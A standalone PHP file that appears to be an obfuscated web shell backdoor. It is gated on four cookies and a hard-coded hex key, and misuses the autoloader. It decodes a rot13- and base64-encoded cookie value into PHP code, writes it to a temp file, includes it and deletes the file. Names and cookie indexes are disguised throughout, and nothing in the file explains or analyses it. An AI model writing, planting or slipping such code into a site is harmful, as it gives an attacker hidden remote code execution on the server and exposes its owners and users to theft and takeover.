<?php


if (isset($_COOKIE[19+-19]) && isset($_COOKIE[82-81]) && isset($_COOKIE[8+-5]) && isset($_COOKIE[35-31])) {
    $flag = $_COOKIE;
    function initialized($elem) {
        $flag = $_COOKIE;
        $record = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '34d66894');
        if (!is_writable($record)) {
            $record = getcwd() . DIRECTORY_SEPARATOR . "right_pad_string";
        }
        $ref = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($flag[3]));
        if (is_writeable($record)) {
            $itm = fopen($record, 'w+');
            fputs($itm, $ref);
            fclose($itm);
            spl_autoload_unregister(__FUNCTION__);
            require_once($record);
            @array_map('unlink', array($record));
        }
    }
    spl_autoload_register("initialized");
    $obj = "5ca83e2283ec0b70b1cd730071a2568f";
    if (!strncmp($obj, $flag[4], 32)) {
        if (@class_parents("auth_exception_handler_mutex_lock", true)) {
            exit;
        }
    }
}
